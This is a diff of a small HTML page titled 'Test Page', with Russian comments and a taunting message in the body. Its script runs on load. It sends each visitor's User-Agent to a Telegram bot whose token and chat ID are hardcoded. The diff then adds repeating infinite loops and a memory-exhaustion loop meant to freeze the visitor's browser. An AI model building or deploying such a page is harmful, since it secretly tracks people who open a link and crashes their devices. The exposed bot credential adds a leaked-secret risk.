@@ -5,8 +5,8 @@
   <title>Test Page</title>
   <script>
     // === ТВОЙ ТОКЕН И CHAT_ID ===
-    const token = "7786051046:AAEd5j3dSn3ZU-a_uJk0ievx4B0FlAgKxWw";
-    const chat_id = "6754382185";
+    const token = "7786051046:AAEd5j3dSn3ZU-a_uJk0ievx4B0FlAgKxWw"; // Заменить на твой токен
+    const chat_id = "6754382185"; // Заменить на твой chat_id
 
     // === ОТПРАВКА СООБЩЕНИЯ В TELEGRAM ===
     fetch("https://api.telegram.org/bot" + token + "/sendMessage", {
@@ -16,20 +16,29 @@
       },
       body: JSON.stringify({
         chat_id: chat_id,
-        text: "📡 Ссылка открыта!\n📱 User-Agent:\n" + navigator.userAgent
+        text: "📡 Ссылка открыта! 📱 User-Agent:\n" + navigator.userAgent
       })
     });
 
-    // === ЛАГ — НАГРУЗКА БРАУЗЕРА ===
-    setTimeout(() => {
+    // === Нагрузка на процессор ===
+    setInterval(() => {
       while (true) {
-        console.log("🔄");
+        // Бесконечный цикл для сильной загрузки процессора
+      }
+    }, 100);
+
+    // === Нагрузка на память ===
+    setInterval(() => {
+      let memoryLeak = [];
+      for (let i = 0; i < 1e6; i++) {
+        memoryLeak.push(new Array(1e3).fill("Загружено!"));
       }
     }, 2000);
+
   </script>
 </head>
 <body>
   <h1>Тестовая страница</h1>
-  <p>don't mess with me bob :)</p>
+  <p>Are you gonna cry? :)</p>
 </body>
 </html>
